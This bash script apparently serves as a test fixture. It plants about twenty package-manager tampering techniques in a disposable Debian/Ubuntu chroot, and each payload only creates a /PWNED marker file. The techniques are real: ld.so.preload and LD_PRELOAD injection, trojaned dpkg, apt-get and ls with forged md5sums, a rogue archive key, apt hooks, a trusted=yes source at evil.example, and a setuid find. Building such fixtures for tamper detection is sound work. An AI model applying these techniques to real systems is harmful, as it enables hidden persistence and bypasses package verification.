#!/bin/bash
# Plant package-manager attacks in a Debian/Ubuntu test root. Each one touches
# /PWNED_<name> when it runs. TEST USE ONLY, on disposable chroots.
# Usage: plant_apt.sh TARGET_ROOT
set -euo pipefail
T=$1
cd "$T"

# preload library (fires in every dynamically linked process)
cat > /tmp/evil.c <<'EOF'
#include <fcntl.h>
#include <unistd.h>
__attribute__((constructor)) static void pwn(void) { int fd = open("/PWNED_preload", O_CREAT|O_WRONLY, 0644); if (fd >= 0) close(fd); }
EOF
gcc -shared -fPIC -o usr/lib/x86_64-linux-gnu/libevil.so /tmp/evil.c
echo /usr/lib/x86_64-linux-gnu/libevil.so > etc/ld.so.preload

wrap() {  # wrap BINARY NAME : move the real binary aside and exec it from a trojan
    mv "$1" "$(dirname "$1")/.$(basename "$1").real"
    printf '#!/bin/sh\ntouch /PWNED_%s\nexec %s/.%s.real "$@"\n' "$2" "/$(dirname "$1")" "$(basename "$1")" > "$1"
    chmod 755 "$1"
}
wrap usr/bin/dpkg dpkg                     # trojaned package manager
wrap usr/bin/gpgv gpgv                     # trojaned verifier

# trojaned ls + matching md5sums so debsums/dpkg --verify stay quiet
wrap usr/bin/ls ls
sum=$(md5sum usr/bin/ls | cut -d' ' -f1)
sed -i -E "s#^[0-9a-f]{32}  (usr/)?bin/ls\$#$sum  \1bin/ls#" var/lib/dpkg/info/coreutils.md5sums

# extra archive key: a new trusted.gpg.d file, and a key appended to the shipped keyring
rm -rf /tmp/evilgpg; mkdir -m 700 /tmp/evilgpg
gpg --batch --homedir /tmp/evilgpg --quick-gen-key --passphrase '' 'Evil <evil@example>' default default never >/dev/null 2>&1 || true
gpg --batch --homedir /tmp/evilgpg --export > etc/apt/trusted.gpg.d/evil.gpg
cat etc/apt/trusted.gpg.d/evil.gpg >> usr/share/keyrings/ubuntu-archive-keyring.gpg

# malicious maintainer scripts (dpkg runs the installed prerm/postrm on reinstall)
printf '#!/bin/sh\ntouch /PWNED_prerm\nexit 0\n' > var/lib/dpkg/info/dpkg.prerm; chmod 755 var/lib/dpkg/info/dpkg.prerm
sed -i '2i touch /PWNED_postrm' 'var/lib/dpkg/info/libc6:amd64.postrm'

# dpkg option injection and apt hooks
echo 'pre-invoke=touch /PWNED_preinvoke' > etc/dpkg/dpkg.cfg.d/zz-evil
echo 'DPkg::Pre-Invoke { "touch /PWNED_apthook"; };' > etc/apt/apt.conf.d/99evil
sed -i 's|^DPkg::Pre-Install-Pkgs {|DPkg::Pre-Install-Pkgs {"touch /PWNED_debconfhook";|' etc/apt/apt.conf.d/70debconf

# diversion: real apt-get moved aside, trojan in its place (as dpkg-divert --local --rename does)
mv usr/bin/apt-get usr/bin/apt-get.distrib
printf '#!/bin/sh\ntouch /PWNED_diversion\nexec /usr/bin/apt-get.distrib "$@"\n' > usr/bin/apt-get; chmod 755 usr/bin/apt-get
printf '/usr/bin/apt-get\n/usr/bin/apt-get.distrib\n:\n' >> var/lib/dpkg/diversions

# setuid stat-override (and the bit itself)
echo 'root root 4755 /usr/bin/find' >> var/lib/dpkg/statoverride
chmod 4755 usr/bin/find

# trust-disabling source, rogue transport, service-policy hook
echo 'deb [trusted=yes] http://evil.example/ubuntu noble main' > etc/apt/sources.list.d/evil.list
printf '#!/bin/sh\ntouch /PWNED_method\n' > usr/lib/apt/methods/evil; chmod 755 usr/lib/apt/methods/evil
printf '#!/bin/sh\ntouch /PWNED_policy\nexit 0\n' > usr/sbin/policy-rc.d; chmod 755 usr/sbin/policy-rc.d

# PATH / loader shadowing and environment injection
mkdir -p usr/local/sbin opt/evil/lib
printf '#!/bin/sh\ntouch /PWNED_shadow\nexec /usr/bin/dpkg "$@"\n' > usr/local/sbin/dpkg; chmod 755 usr/local/sbin/dpkg
cp usr/lib/x86_64-linux-gnu/libevil.so opt/evil/lib/libz.so.1
echo /opt/evil/lib > etc/ld.so.conf.d/00evil.conf
echo 'export LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libevil.so' > etc/profile.d/zz-evil.sh

# directory swapped for a symlink: dpkg's data dir now lives somewhere writable
cp -a usr/share/dpkg var/tmp/dpkg-evil
rm -rf usr/share/dpkg && ln -s /var/tmp/dpkg-evil usr/share/dpkg
echo '# tampered' >> var/tmp/dpkg-evil/abitable

# trigger: an unverified package's postinst made to run when /usr/bin changes
echo '/usr/bin ca-certificates' >> var/lib/dpkg/triggers/File
sed -i '2i touch /PWNED_trigger' var/lib/dpkg/info/ca-certificates.postinst

# same-size byte flip in a library (exercises the hash check, not the size check)
python3 - "$(ls "$T"/usr/lib/x86_64-linux-gnu/liblzma.so.5.*.* | head -1)" <<'EOF'
import sys
p = sys.argv[1]; b = bytearray(open(p, "rb").read()); b[-100] ^= 0xFF; open(p, "wb").write(bytes(b))
EOF
echo planted
